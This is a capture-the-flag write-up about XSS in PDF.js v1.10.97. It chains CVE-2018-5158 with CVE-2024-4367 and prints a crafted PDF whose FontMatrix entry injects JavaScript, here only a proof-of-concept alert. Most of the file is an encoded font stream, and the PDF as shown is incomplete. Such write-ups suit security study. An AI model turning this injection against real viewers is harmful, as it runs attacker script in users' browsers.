# pwnable document format

```
We patched the XSS, so the library is secure now right?

pdf-web.k17.kctf.cloud
nc xss-bot-pdf.k17.kctf.cloud 1337 
```

We need to craft a PDF file and make XSS attack to PDF.js v1.10.97 used in the attachment. The version is prone to:

- [CVE-2024-4367](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)
- [CVE-2018-5158](https://github.com/puzzle-tools/-CVE-2018-5158.pdf)

However, the version used contains patch for CVE-2024-4367:

```javascript
let fontMatrix = dict.getArray("FontMatrix");
if (
  !Array.isArray(fontMatrix) ||
  fontMatrix.length !== 6 ||
  fontMatrix.some(x => typeof x !== "number")
) {
  fontMatrix = _util.FONT_IDENTITY_MATRIX;
}
```

Using CVE-2018-5158, we can execute arbitrary code in service worker. However, we cannot read cookie from there. What if we combine the two?

1. Use CVE-2018-5158 to inject code to run in service work environment, and hijack `postMessage` to modify the data sent to pdf.js
2. Although CVE-2024-4367 is patched in service worker, we can send the crafted fontMatrix variable via our hijacked `postMessage`

The result PDF is modified from the PoCs of the two CVEs above:

- [CVE-2024-4367-v1.pdf](https://github.com/clarkio/pdfjs-vuln-demo/blob/main/example-pdfs/CVE-2024-4367-v1.pdf)
- [cve.pdf](https://github.com/puzzle-tools/-CVE-2018-5158.pdf/blob/main/cve.pdf)

With some manual modifications, since the object ids must be remapped.

```pdf
%PDF-1.7

1 0 obj
<<
  /Pages 2 0 R
  /Type /Catalog
>>
endobj

2 0 obj
<<
  /Count 1
  /Kids [3 0 R]
  /MediaBox [0 0 100 100]
  /Type /Pages
>>
endobj

3 0 obj
<<
  /Contents 4 0 R
  /Parent 2 0 R
  /Resources << 
    /Font << /F1 6 0 R >>
    /XObject << /Im11 11 0 R >>
  >>
  /Type /Page
>>
endobj

4 0 obj
<<
>>
stream
  BT
    /Para << /MCID 1 >>
    BDC
      /Im11 Do
    EMC
  ET
BT
7 Tr
10 20 TD
/F1 20 Tf
(F) Tj
ET
0 0 1 rg
0 0 200 50 re
f
endstream
endobj

6 0 obj
<<
  /BaseFont /SNCSTG+CMBX12
  /FontDescriptor 7 0 R
  /Subtype /Type1
  /FontMatrix [1 2 3 4 5 (1\); alert\('origin: '+window.origin+'\\npdf url: '+window.PDFViewerApplication.url)]
  /Type /Font
>>
endobj

7 0 obj
<<
  /Flags 4
  /FontBBox [ -53 -251 1139 750 ]
  /FontFile 9 0 R
  /FontName /SNCSTG+CMBX12
  /ItalicAngle 0
  /Type /FontDescriptor
>>
endobj

9 0 obj
<< 
  /Filter /ASCII85Decode
>>
stream
,p?)`/O<oc@V&#IDKIHb/hf=/6VTmL0esk*0Jb=80JWt],ueT#Ch5XM6VTmL0es(^<b6;mBl@lM+>>K*/het7$7-ucEb/[$Bl@lW@<?'A+AHcl+A-cm+>GYp0fD'I2``WH+>PW)3=7&Y6ZQaHFDl1\+@KX]Bk/>\/g*c)DImkr,suTiH#dV3BQQ9X6Z6phEbT0"F<DuA.3L?*3B&K31,(CB+@0jUEbT#lDBMY^FD,6&@<?3n@;I&bDe!KmFEn3>6Z6phEbT0"F?1Nm4D8hYE&oX*GB\6`@;U'<DfTJS.4cTcBln#2;Iso\Ecu#)+@^9eF<F=eD.OhW9gVr:1+in[+B3#gF!*qjDKI""De=*8@<,p%BlbD5Bk(^lF(Jl)F`(`$EZfI;AKXoC9H[,MASrV[Df0Y>9PJ!JDKBA?+BE&oF(oQ1+>GK'/d`mI<+oue+Dbb%ASuR#+DGm>Bl5&8BOr;p@q0FoE+*X0Bl7Q+Anc'm+AYI#/p)>[/0JA=A0>T-+CT)-D[Id5@<Q'nCggdhAKZ22FD)e*+@\Xo+CT@Q+D>k=E&oX*F(96)E--.RF(oGCDfTJD:I\#1$7-ueDIc+QD/Ej%FE7dYDf0YbBl[cpFDl2F01/H#=>;QRCMn'7DL4$(9gVr:1*C1CDId?tDKI"3F`9!6DJ=*5AP#94CMn'7DL5o:E!e6uDJ=*5AP#94B4Z0-2)$^<2`<Z=AT8i(G[kD?7W30d<-`Fo+D58-+>G!ME?J\-A:8fDDf?h2@;L!rI;*;)Cia.pHZNV=AKZ)8F_,uJAmoLsAUS9)AScF!I=#R7Cia09BkCpmF(G\50d("@@rri&AS5^p$84keDKJj'E+L.P3?VjDAdTh;7W30d9jr-aBm:b)0d&4o1E\Ls2'?*]?!SRnART+fDJXS@A7]?[01KktFA?7]AKWX):.%rZ7k6r$6<Grt+Co%q$84keDKJ33Dg3CO/N#=,/M]1<+>GT,3?U7<0HbdaART+fDJXS@A7]?[03)n(EHPha6m+?@0JGFD3?VjDAdU1f@;0V$<-`Fo+>=pKAS)9&7W30d8T&-Y+?:QTBk)6-A9Di6@V'1dD@/%?ATDj+Df-[G0JG:80JG72+ED%%A8c@%Gp$X/AdU1dDff]'AKWBgDfBuBBkM+$+C$TX0On?A2)-4.3B9#L+>PW)3?UV)ATDKp@;[2^@<?0oD..O#@ps0r;f?/[ATW2?>VJ#h4D8hYE&oX*GB\6`@;U'<DfTJS>VJ#i/0K.NFD)dpATMF'G%G2,7W30d+AQ?^AKX?76<Grt/h%o`ART+fDJXS@A7]?[01L)#CeeDUAKWBg9gVr:1+=>dART+fDJXS@A7]?[01KAeBl&&i@;TQu-pqoiE-686EZe(pA7]e!.3NYB@:X:oCj@.6AS)9&=(Q)YBQP@F6>p[N.3NYB@:X:oCj@.6AS)9&8T\BWBk'GHB5D-%0Han;AdU2*F%0kgARnVOFCSu,AmoLsAKYMpAdU1kDId=!Ch[cu:iCDhFD5Z2+>#<%0Han;AdU1kDId=!Ch[cu<+ouUCMm^)F!*=o+Co%q$>"*c+ED%%A8c@%Gp$X/AdU1[DI[TqBl7Q+1,Us4@<-BsGmZ5J0d&5/2'@6#+DG_(AU#>/G[kD00.q-\FC\rp+E2IFI3<-?EXH?"E$.%r+>6#'E-670A9Di62Du[266L5iF:)Q$E$.%t+>6))E-670A9Di62E2g46m-GkF:)Q$E$.&!+>6/+E-670A9Di62_Z@-7NcYmF:)Q$E$.(o+>65-E-670A9Di62_lL/80DkoF:)Q$E$.(q+>6;/E-670A9Di62`;d39H\:sF:)Q$E$.(u+>6G3E-670A9Di62`W!6:EXV!F:)Q$E$.+o+>6P6E-670A9Di63&2U0;BTq$F:)Q$E$.+r+>6Y9E-670A9Di63&Da2<$6.&F:)Q$E$.+t+>6_;E-670A9Di63&Vm4<Zl@(F:)Q$E$.,!+>6e=E-670A9Di63A;R/=s.d,F:)Q$E$./"+>7.GE-670A9Di63B/-7@N]W4F:)Q$E$./$+>74IE-670A9Di61c-=.@rH4$@3BN3F:)Q$E$-kh0H`#Z+E2IF$=n9u+>GQ)+>7:KE-670A9Di62)ZR1ASGdjF<GOFF:)Q$E$-kh1*A5^+E2IF$=n9u+>GSn04nf=E-670A9Di60f1"+AnGa"E-670A9Di60esk)An`B,F`[t$F`8H\1E\>_Bm+&1E-670A9Di60f'q*Ao&T/F`[t$F`8H\1*A5^Dfp(CE-670A9Di60ebC+04uDHF`[t$F`8HX0Jjn*BHV8:F:)Q$E$-tp+>7DRE+ig#+E2IF$=n9u+>GQ-+>7FOE-670A9Di60ebL.05;VKF`[t$F`8HX0K1+-CERS=F:)Q$E$-kh3$9kj+E2IF$=n9u+>GQ1+>7RSE-670A9Di60ek@)05_nOF`[t$F`8H\2]sbkBl7K)E-670A9Di60ekC*05htPF`[t$F`8H[3?TtnDIjr0F`[t$F`8HX0esk)E$0+BF:)Q$E$-tk+>7\BEb0-)AS-$,E-670A9Di61bg++E+*cuDK9H(BQPA9F`[t$F`8H[2BXYlATDL'A0>i6F:)Q$E$-ki1E\>j+E2IF$=n9u+>u"u06),GF*),7DBNn@F:)Q$E$..r+>7_WDffQ$@VfjlAoo/7F`[t$F`8HZ1a"GkF`2A5A7B@qBkM+$+E2IF$=n9u+>GT-+>7aXE-670A9Di60ekO.0687TF`[t$F`8H\2'=PnAThX&+E2IF$=n9u+>ktu06:iP+E2IF$=n9u+>c#"06:r<F(c\8F`[t$F`8HX0fC.-F<GOFF:)Q$E$."m+>7hMEb/f)E-670A9Di62)$.+FE_XGE-670A9Di60ekU006JCVF`[t$F`8HX0fU:/Fs(aHF:)Q$E$-ki3?Tu!+E2IF$=n9u+>GW*+>7s^E-670A9Di60etI+06n[ZF`[t$F`8HX1,9t*H6@0LF:)Q$E$-ts+>8%PEc3(>F`[t2ART+fDJXS@A7]?[@s)g4ASuU#Bk)6-ASu#c@s)g4ASuU%Bl%?'AS$*t@g^o?Ddtk^C9iN*pom%'G:hq%4jt_==-tEgHeEGQFnuRQPpro,K&:VB6']R/&DZ;7..ojZ+8pQP\[2Ts\s$"'qgA<KO]'Tg]*d3;(<4[rlTqkr*=3];<']SnrGd3cJSP@u!P_5QTQ,*6%T&l5pijYHGdGAhgWYE'j\b0D2G4GUWmWJY<K(16Vpm#d@\)$d+pN-@*=+,-n9>Jnp%HiIT?mNZ8s(V2II)qLV0cD(1621\HJPZ%13:5K,T0c&*<YsIbg@ba6Kj_-(Y=#4VN4?(Ml(),?IlSL]anOk1pJ4=ffZ:Xcf*%al!K!/WXn.;L6#hAi[$q5l"j:j^).KUZT"f1r@qZS$?K(YkPZ0BMlkL!Ee?TrCNSr?15D:8P&)1modE$/^?C@9QIe%I)5>-i3I]C([$(H=5`s\S@\ImJ_0]U8%ILk22u)okcd,+!#bG8m<*ATP<6tUbaWk6:0k_`&3sK*[Sla"QXqLbM4olV%NR7f#C<Ws?9##Z^s2.U'lXPQ3g0Qo(q*5>ii7DsJj`Q7/A?&jFd>jZ13_I5+"NsI8MBalTU9Ijdlc#D]@M1oLXA&_IDhPDTYGbl<Um?k3-Q9LMBCr+r:`VUB[*bl$L^WHXY<lc_I*kNcd-cTY??_3"&$DtZAKsT2mkLB61KTd8^kj\fd.>"E/f$@sY1+ISQrFqtam:4Z5(mqn-lK*]K#\UtQ42c*,F^m+>&(nIBVNVV/!s?9GH_&:isP^k,`q*)d,J<h=&(A8V'oBm>jkGMjrC&-_RMB6%L(?J5OrVt&9G[e9nlKRpSnV8Nd558H)T]Q^LH+5c,3pLFWGF]`qE6gaH3W$F`Q%^9KdN3WK,M\d`=i%fqH!n:t1D0VgTDk\/tmi^si_P/Z?s@<@Z8J*]'n\IeMemV0<`.HKA!b!nGBt],qO6iQX!>d1p/9\uHO@Fr6RG)CV&+&j0>[MDj+U2+u]RR^3%D.sh+*8%kTM!@bg6E`oK-ME9@m'ZjjZ!>\!2WM)7B<n2d""kMe.=9#h#;I'a>S2nLk>$@C9D1#h0DhNnNOFbN*8R-+e:&p#tDOHaSjm<KMTG]Fg)?"/@%%D8?f[^1j]R`kss*b7-h9G>IS#sI:!<YCaKIFtjg?'K.Qbd:=K+7`3V.3SnK1)*Ir>DOn!JAPk;T:+i&#b/mc4coT`7`SRRf"FMn.V!/clsLco/X.9;BS+]>4R*@SD933/*hLmKc!hq>FEV?)?t&d/\W^lj1sS0VA(</PZC1U/[(JVY*md@g.R`N[BC#,U:@Y*IT1IaV=<&3la&;\OfT`%JK0,IRjL'NUk@h6N9T-G^VpF/4h</eW`DS*A*,Sd1U,%?a#IkR$Y\m6"mlM1]+sKpD?u?]@@H;cK"(GK^rHo6^H1kXVd#Q7c(AN-ctQu)esU:O6i0S5jC$1hEir)so/`W`jKkZ'qV\Kic$nUMA"XId9je:+i/&*jAiX3^;!P64#Y(Vhp8pL^f]JP7Q+!%bjTm],]H&tXAHGj;.nUZG"o0$O&K)!>4tK6RY$S0M!ED=eIM!4LIOPC[(R@R`/JMQF/'l_##+%+?]T@!!C$,6:SM:+bZ'D<ToYj!tX7"3g5L5A739!b<!H%%^"s[tr6r<O'R])$#\f6crq)P<q4_R:"?W\_rH'!bUpm;:73?"gY(M#DS4JL\71o^_k2%q-on-iDdRg-)c*_Q-dX1l%S>hIP3=J6EG\s=DEY+,@BCausEbSrTG*47@^*,s"Yp6E-]])/kTfNOle6[lA^D"[VsXGRY&A=50JbrRM/qB0Do//6,3^"e$qTajrF/+<d(1KJiF^6MQTCt@oBY-k^t%6"814!+M)H#Y@nk,\"]dRpm3ImNB("psF8pM)@%d+-j?K3B9l&1KH?B%AJ.E*-J'FFG>iQ<TDJ=sQ4DTL7R[R(XU3q_V,8'9m]S@_[C`q(l_RI>!3[>7[QIm!ADk;AJsP*Rjog>=G2AHP;+OE-bD8=8D(j/IB%?W*s%)"m34VD.o-5AS1K\]XWLT>B-.AV[+oGejD-6**&a-*ULHdWo_td6.$!_/Ku]%ZR"D(517!;Qou[sAO&m<<s$$'M6D"(?call]p-PF@NEahLSOHEA<65ZBSVn8ZAXd^5'TiiWM86gj,\6`VOb7f9RtelV.`'aT@7_<o[E-!W1=jB!8:%,n4G39D$nQ1*(h+G2AjTRCDdeGenosu+pLdN+CIUc_-=VB+R!JsGC)Ud@lup2Y',5_bR[MM6`&ZGdOL-%F$\EElt/o1/+fqu+b?bTVit%sq4u!iINsi%?P+cB>ofNE>\W[N(&:JHBq3=cbF!-=+A9$`B"ajnGq)bg!=jPOM.oI\2KrT=!>j]?D6en>4:lgB;&`h8e`SV]l;DVjp*&0?2p$29:V=t9@XlXOmegGJ8dYG`Jk80h2=[LH$WIO\F/QD4I<A4kQ;-"^WkKZ9SkHfH$NohkkI^<GL>=h7:EYRBo(%m<I%YXj.3?>Y7"u[$1SNLaPtNBf)&/k0$(8FK/2Md]R[2CXF2OP:(VAVS;ZDT;V8?1@[XcS3Ym7<bm#coHJc'd]>YVR;;`RD$n551XeX^_moLGfcr*2*:LQs+Efle*7Kiua/.2D"]9B9$J?6$>$DRl1;9c@.2/3"uO2dm08A0h/@h3A@SF>$].J_57o^OO#:(oIZ2X>IFa97&,@4j<t\=%']35.b_OAa7uQRrI&G)JOjVAIh%&P"bmbO*n&&,B*f12SVnE%SRs@=NfTJ@Lf9->)$P8pO3'mm3s=t9\<!M:GNI:Y(>Tj+=L"7ZrN3k/[T*h]lJUpN:M*";QI?RN)XS/(-];Wi3Go@dgY(nd=Ns7.J^aUFg2:hFXn/BZt/jj1puSXHDtCJF,,qppf'ii><2qhG0V$(L$"=Y=,B]IMbOp9\dbl="_mGn9P3m.7as)h57=4db`m#WcHKX(borb8%H9_>FC"QcJm>u*Rg#nMPYs0&E\sTXkj'!YqP]\qeGu)j7X'@'mq"@(Na;4*Zs(7AboUiF!KPd`[\e)K5KHZ_@>)`5c:jEL/HZs2$I<2s&ZUcEpG5<fV,RI5k9l_PToX*,,KO1T!ftd&egI+BS%&TOhLOBNpqCrH:K3FZ6uttfb>B4i[/.UkHNslSJ\>%>^:3_iY#ZF&Y"j&qdZ44q%tD;>6A+!*N:P^K*7lb#o0/f/LDoc&kt@As,"S9NY7B%mTHLbF1<r2tW)_)$-VCWl[dUgKa.(KIX^a(^8_oKepF^9T;:GV]a[RRkT;YSn$8Lt\H=AYOY-D&YhG#M;9=KSb`lD[B,2=h-I\Xib48\`;2khra_6#lDD_:-M-%Lm8i,4i#8j]s+5]5]bs#*.sl,%,L'N.C\Yb+nG%""'aU*c8s,i=<;IlbdFBYPJ[s7MFIs(]@4#H47'fGj0'O@B9f<eUM,Le$IGG.3&-5@@DNi9NErAT1PebdPV(pj_9`S#ZOJTZc.R=nc-<aHs?;oZ,eiNp?rbe)7t!eq5sI,l58#,%V&,4VH:\*=EnXB&7-QTpCauT?@VF&ugJi$rD-e7C>.Rp!4mY]7em#UA_%jLa$S9"hRlX"8tr7)VF=DYI*YeeP,lbkTT:BAf*%f+TYS/M36-,!XpVE1D7L`GW1rY2Bs0Us'[)BMEQdU,KLPqr<p`4a`XErMdiEj09b9`^U)]?+@o?'>cCt9@c?@t,kc7A^+%;kO>!ILpGn6rRr8s,<=nH]ff-&dTJ`_/(db[k;Fr"!Z_]Zj+rF?('B:D[GS)ZCk,7OHEL:O,4dLihN%H/U0t`7#YIr[^>OS_`j@3P[\l3c;d\CO@[Wgo_GpE8uRf<H+bO:/s-$.5dI[aREAbh2Xdp4A^n(J+0jmlh8\thR<'AVAiKqRPf8"\A(#XG[V`h@4MqSdMajuDSX^.5c_<f1M$oL]_.U"mBJV9DL34CG_fN\*K`oj'X2oBR.r7t";]*asF)pYg$!f=#I;-gu8K&H/f!H%>rblBm7]E5T%<*Yc/K`-k3,hR"(c6dIrA5FPATaT2RX1m\jQ3oZF0@R]IQ<aCA5[aJ4Gq-kn-,)8g07PJ@^OC9'=ll#iITAF0:7paE@CQ^)mkJPP*g^4=T[Jo#g/S.P`fO>bab@?+R58CGqr6/irpN%htcD#fGqSlmMF.8c@;mI41kT)3_FJsJ!!O;1Bb]<]n-+*541E$+'&>c"qhMW_T9mt[KW5pce6u0kW@#\E`EcknVhsif&Bt6MK?bYrb'aekK?dY9OC\:Gle;O)DDIB48G1RJZ.5I?WgR45c,U;[c2YkaIrpL-jX68KF[Tl:Foi:?[*=KW4D!hWVGQh;a[+#ZSKk`MpV%Q-'e.pa_P*0-eCdYMsGn7LA,oln+.F9AY[TD!KS51d<'MT.,H*)S<'\);po3-.ImA\e]Bh>%QJL%+b6d&Gu.X6TG`EiA@kE[Rh+).>J!H^/%S!I(Te6QqQM1J^V!0Pu2qicS]Y4]FVB)lZF\I.mR/HSOE`h6OJYZ+^`e1WEmKk#lRMh).6"GeW'BK,B>9qjJjl5U+VkW(]abd68CrbZ\!op\eMN["usP+W(iJ9^Xsj'VPmVTVZN\AY!IH)l\"PCp+3cSZ6\;Eum^B'W;]nU7HKb.n;(fCj[Gj)VKj+g1u)]D\ALOS-5EAl,7@\*\^\:"(V!-S1VpmP\E*gK/`8fZhP,aY/LuRd/+3kHe*8df/W+LO'?UF,#S&[cE>)enQ!-W8=k0HCITTEC!h0;UT5(.>p65:/abYh0BuT?Co*"a-%IN!Kb;@*\#N:d!j>7=p%&*qG8jLO+IR.:_nL.5(5NO-Gu\:G/<0Eruq`$"hlG!LKHFs)a.j::==`&:(Z'`W?mNY"le*V"u4nGG!G/?1cD[!JOoKs(@*.Co<h?crP<6Ci_MBOW4`nu^1,pujeTGH!Hb#)np0fgZfUlM-LZ<QG>VQp>)Gq8U2d[M/%OV($h*+mDCj[[9l<C38ITGDW)?,+Y>k_-ZrmmB35V-Z:5'L_U]6lX&;iLf?,WO*+f`Kt:-X8$'oMJC-eCX:p1qHj4Aa,9QTsRW04L[9-"Bi[JVN-$]HID-KB)NkTfEf$3/Sg5:(MJS<1W<C0t%K4-LN>eAY`(--DtuXI.d;g/-"0SWO3oX3XYtMA/A/Ln?&b.2Qg&(ohQc#fDC%<d.$Vl4[tLM4N8J9&(+T*Km59c!"n8i$^pZkH[C@(_t;e-/qb&Mm5W;0-am1b[)(!o@3oPs%=Yp=OCI86939WDlW'U(L@PB=U5R/hSVEm4/4gu2AaX7=k5oH`[f#<jiFCoCL;3sC05NtJd=)c3HA2)Fk+E*r:'I.h'baYY]5itZ'Bt4-(Q:S._H&3uJ,rn#4/T*$*)ohO,ns'5_*mX>\BmpAF'3jH7'n0q$i#?BHXWmYC-/mMDP[nTb+C'+btCJ6Q7$X8jU>SH*qnAr6P1+81"KkF%fFKI@7<Tpgb^4iVEA)JafKmo2h3h5fXdL6J86en8[`Dk-`s:j"(FC:6Br2WI)e<OifOVO^ML\THe>>L(&"0[V)\kr-S.H6D!N(9>&eOIY[A6'(_f>qYjO%P2At4rnl6RkZ<K*)WI+EMbiRu6oO"pEMVD3ZCn84C^aSlCgdS=)KohfOZqDPp0QcP.XJM!iB(5KDeFPVa#**NIDOO:Dj]FX8$[g&*^\FM4nD8@+1*aER3df,t]JeW?f/-%oYbfibEq+TMKE+H$V/>kSnX=X'M6CA>_HWIRWe,f\a:ML.5e!-=EZ@ah\%jBf+#D)$@&6.J6]Z[u.pqG+^/?1Gj?ZhbFBsblhII)0Zlob,0S&.4JT]iRgNrL$j;5%PR'7OqX)_@jmA@0aMQi_]-1fM%B*\M.a;S&\->:Y[2NZQe^?>+ai7(iR19k0>)#00n%XLXKmJJ)@:8$%\X8W!BB"_PMs!$,[q^uMhp)67U8*:6XaQl0X*rO)i=RM9Y'_RKs=@IW<Z(138L#urJ'"_N7T58=@W=q2g#&/"SKRo:U4L:+f1Xqij=p+c[i_Cd8hGFJ`GKq&]K8[WoRjLS+N&m\K4Wk8lko9/]*($U/[n1tDPmX.4e_6LrAkT+;CNuZuO7%>1D7-kr$e$p.fs?-Em;!&,UFi<l\)VM@8?qK%QJ.2Lr*$#[XK!lU?2hZG(SX#8[M<I)bTOfNRq>kq'rl**L,7S8b$3bYHH$H60-CIsmt4dAVn86Gk[`(r>k>]gDiL.OYLM4?kd_U#_DhNceQWU5'+SW]Vg1OX2cs:W$kS<t#O,b3=!oo<8jTEQ8+fJ-mgCCi6QM11[,QM,%HDsA9hVf#6+:#Yp7N;;_$uNhDg`>DY!u9^hE$QnN#%Vd:hWc4(=)'rG.IR?<MO97!B@+sg@)C,?!d8in4CjA]W@<LFUs0URSl8aht#d8,4@QF"7(E]RJ7%7Xo!k+[8[Hs!)+>,3O;5)4Y'sd]j[TfqU^J6.'s?]$GQ\ce,OGKWbAogaQ=N&UMdcn,n!@p4P\,)R,W76@88';;.CD%cu/Y)Q<R^nK#4Y$rca*R<Em:6AEW@G;8/IthIa-O#LKl&3o/U:b75k)kY8WMRjtm*OnJY3?;8;bH2C*B\b/W9V`#^(,p#_9E8Zj0RcA:)_%n(cITJofHumG@=%>0OZ?\/0@]L1J=>U1S8#<L9`9oS3k;1X?EY]2tOYe8"%F.8*9(U^K)[;Sd*u-jiIK>Kt9@X'dgi%dJVU.E"G@Ggg]^$>c+oI#1="eEU_TKX5)ja"O]J4Ns()0+PG$PG2MbVak.pb..f[';*T#JDeZr;HGi(R+[VAFj\13nI'BF#7VWmn4)ZNQ(i@]jlp42'T1M=e(4\pBF!)nP90jIEWgD%OA,lSG/Q-nA(61(1&QN.dVNoI9*q>nm0mEt+Fn24+LI%k11]Ck8$L?<_4\\:DheKu7?[(;9nn#,B+b0BV"k(C/'+q/#(E,!q-hI0C!,PdXM6FQSkZ`ElS2D5uf.jX%(u?*Cdj/R;,*a;!4o[ZCr"3H/WK?#<9.-N1$Qm/X!0nSWF"kk"Q$Cl$F&8RlWPLSh>`LDkeI_;;p_6+>:,8`mOX"\8Ic#d+;G0J^\Rdten"T%l=E@Tf7Gb3Md<RimD;/'QgklJ:*/q-X*8UjJhb@#^q!=n8B1n<jVJ/XOdkF&GKrd6L#$]?Y.ELlXbn3hU0o6'V(1^<OE?#F\EsMTj+*I>^7M"lJ(Tm+Q_L;gPkf,b"m<mbk%:88\%u@s9"eG#ZQ]_kf0M:I32\@<)odKGl/.p6f-+(094>SlKTQkJ).tS3[!:VX&P51&ECtg<ui8`leV#c$73^HElY/5/WVe1R>ML?iXR,Uo:R#1tM]0.Nil-X,JXW/cp)J>DT?o/QARGA#iH-SfP`]B]5WFrSN4m5+@UOI?K4&0!aK4#^>NLABN2>p?rbo![kWbA[A/7+c@6CJSu'=?XFOVK+McS3ai3rs#5=1c[NOW**IY-p(/C6Tu_4KLYh(\ckOe9!kK7D<,HsR:GLh.H)sdK^Z_\gVGJtY.P3-]8K04c9C<OO5p>I<[f-PB19Y]Pg1MDJ4GHd;mcfK4>?-!YPr/poW:]2i;7D9$]H&E.67;=@b3ap"(\f*O9GgaJm6ifVq-Sn&<k.f*<-mc0.rAgoP7I*PqO>q^g+2=m6-OQJ.<POu&V..aTr1_7<cecLO1MDK3,(QQf`"H>%1?C=eB:=S0:p#C_7#s$U_34d)<<P:FGY:PO3iRD:ZLUR4NuWJ$H&"f^TBtdQ3rWr.(lg,=\>+`Vd%;$YqonK'(!Y7@)+6eV;UB]bcBGNLI0s;(kQ\OY)S!c)2fps&cGN]Ns9agP:^f;GSZT&*;_:73"CX(eJdj6h<<F#+19O..jNXqQ)JXF8-WU7+H8J)OkDLmj32&&$,sHuNHJ4BLd3hrbhm:(+.kAtX7?k7g6E[>XTdr')MlcA8-'?p+Y;6L(9jEm"uKd8!W6/]#]Z'qElHLPFbSEp]o&fAW(K#Mq0K[(@l@qq^sCU2/NFUt4Aa3',g6#Ci11Lcbr'\0O>XfeS]=BP(_g/jMC\lB*;hDuFVlL0o2%SfhhSGs/%F+o<Y]B&6("69\pETZiBD:VP,\gJ8_,2<-M\S8qUs9HW1Bp6UM=$!_U/*+F#Ysc;SFrJZL(mPp!W7;A3q\nnJ_C7\[YaMNK_Nco/ePkd)OHf9C@E[!)HPh,^gh$q6M;pR=+fol(Dkd)K`b5W`6KQm=9#pS%dV$>CpbrX0;U5C*iekr`qEuA/Xg!SrH8655OjX>mKl^hkBp)JU\MKH^@t3F7^I?*)&8o$Nlj-B\$M/f5'`$f.`iJ'IKkhg0r^)#s0MHSH8sCkW4L5?'T['Y80N",Cq+6Q([AaQOF-UE7A]fb(tU)3j6UA:*<^XUjqacTG^lQn4_f3.'$NoZpqX*)%8ZUUVsiD7LaJAg^iDR8W+/B3-`:Oh,RX,o+iA?TS3t0l9;1JN4FfmlMEYQU6h8X+Bdc^f\f>e;W0>;i##.CeIm7QJR;n?`G]l0![p:FO7J%Rgs\\9pJ"uK(ddsL`IE497Ll6of/2g+pb"a#;:RnF/YWE!c(h/A`L>m2cLHm<aY_GJ\Wi5;?SuWQpN4.Ek#3De`XWj7.(qG9^gQ^:XnKTh=I"jO`@Um%K6G8j=;q0"43(C=L+bTJS8DBU?e^%M2K_AF?^97i#H`q\jG$hppgFX)FRjY7cgk4Hioj;5pdEOC_Tk9aG2Nn+='8X/Ei5Z]7T*d"lefF:dVH]C]mV:f5d@-Kr7!sC]lb-+nl;LCV%_RA*a<?/afGR29^3cLlQrJN,WcMoJ>_<(E+;t->(FFE-!3'@NTX>7HSoP_oooX0&/sDkq`qU96_L0*+&D<*<TV&Pca;o_._`6:&^a86%SlR'GZo#TkGu00L(7<]?tZ/=D``YXpbMC9))_]/0M5m,g*J\4mBffFSdgU$n+C7flG;`(1JnO`:p@^.$RXNo,l7Cp)`VS*+"(R.fOC\$SGhT!F0<:9p>Q%OYod4Eq7:isO+(u?Bs86B#1.O-muR9C_o+?`21b/d;kmNVPmXtIij^3daaVq8$Mm1?4I,Eb#8SG[p(0"U<)ZX6im*Z5,`Z0gG@:9uE*P_\XXZ_b4'HOL5/6ECe]Od$R[DB@\'p)sG0M<3!S/.u7m'q_TTQ(9B,iME"^C!Bl/n6OnK@o;<1,QrEY/kb]AHV6&3&g.X7Ki?7Rb8jIYW/f'Y$7!^OMn+Y3Y<T.=tE[$IscL=_?M.1D2f@f"sdm.`"&Z^=45$`$_'_g^2csN'!@\[R7;7-i_e$)*'k%GJAN$i/o(rWilJ@npTt./*.)tF-!8Cq):h`r'2k?nJ66<;dHFq%Q2Ng`s=BAg+6GC=VKkhi7`?da;W#:R"78N!6cR,_L-*n]-2lK3d>^04eQ?SpbqCQ>#`QX-b3)*5i":1+lhV]_adsKdAIbhmnd1sjj:X6s%F,AYg/2"VsElL_!9?/g7@3mV!_h),>SV8!O.HcM,R$*@G:qTFhbut9etu,A]P]]k"1)U`'E,:K=ZFmm`]lo[>Q`"p7p=YolU5<UZuY$mne\<7;9[72_%TUM@?Q76SDV6A<*JDp!NT":GkU`X6-9K/]OVBOd51oO)(M`Q0WMF7l\I^l]!(sJ:4o7(:93H+Pg34(2[\2NTU)"(=4-JG>S9jc2O:uM)06e5P3E$\CXpO1Vgdl_s<%/AoR_Ioh*mARoE.4PEd$q:\t(IEd!)@i$,U2IpuXN'W;m3)!CMl&6iJ/N#;skdj<2j&?MeU(@8rlY)RRHCh&Q0J_NLXDAZ8J;[(>ZM%!6)<N9QX+'AupF]r9\IO&*H,uY<hCml*@&m%5/aYF:Em*ioIN?aKtDa,R1^]MRk&idWhjSl;@<34FE9Y]Y`=4IC`-J0u\lnTLhb"Gj<PN3'[am-_XmFkPCXt*CJaKofiKP8NMbh5Ds7cdVFCR)0K49%&Y^&H=qMP\1L$%U0lKF_=Qp]A7uH";R.U>6Bb.-VidlXW7e!R)Z8,qpgK0-;;eC(j"7,(UAGk(?eOYihB^"tK4%nU2HmW'Lk6)dA$DDuL[2EXoTf#4-_ZMEjIdA5&84j<&DRJU7Z@4ua\3\o0hU5L!SjV^*&jW?0qTa6![r0OXKJ34!!R`.C[I,4Sp)'/6U?#k[dpP9p):*[#AfnGV[t2tAj]&dW3,:4A3e9;E?Uh#B$K8LoSEPgRibeYgQ/#>TA'CmQ0CgsU#s"gXDXDVJ6KN9Nl-jKD*p/-TQT5_`GJ[(L"j3\s>`!0-(p3Crl`mOgReZq1hTOoF=SGj&jP]jWhgEFdgEe_TQf^F(1H94Tta"C:jC:i\rkFIV^:EOQid-Lr*8ahgoY=?<b"pRC=qoNMX,-H<C8nagXX`WRWD6g6``$rC=%<+S2bU5lfDnJR:)fJ_YoS:Ys3hEb;UU*aR+r1J[*51WKe1uLhp7S%NVY@M0a=NO+6Can*"HG9d78MQVSm^KY*jlpTDaPhZ_p&-"e+GJLY']tB7(a]=c-cJ`1:'KrCBpq'sqAeMOac2:8I04YQoeRf,Nni!k#H*9?SK%4f]agT2%$9.!43LSIO,\Y)($o[lgn0Br0QGs6kLtdQG<eo?S"--#0Q)=\7G7YAXp.7q3s,Vq%qnW[YLZX[cDc)m9\iq5@:ZOg>Ts4'LrV&^Q5&MEX]$Fa=b`^-b16F.Y5n=jb0F#rE)QYpqGq?<]Gr'_L;eB6B75LOd(3HFd68>l!4#;?lINt>nj_q1?8J2r*-j.h-KOkCV87=h:/'Fb%X5q-M"]rOYjOq9O`X#oT:<_^4K-[BhK`Uff!"`V@XFgmkVhqq$Y+0CQr%lD%)!g(#`QpO)@,i:8Ot!W%MSD<g$QEA%J:QZV7+?_+76e][N$U?O@q!F5Fu4uL[lA,3CC=^@AA?B]?h<OK,+\K&/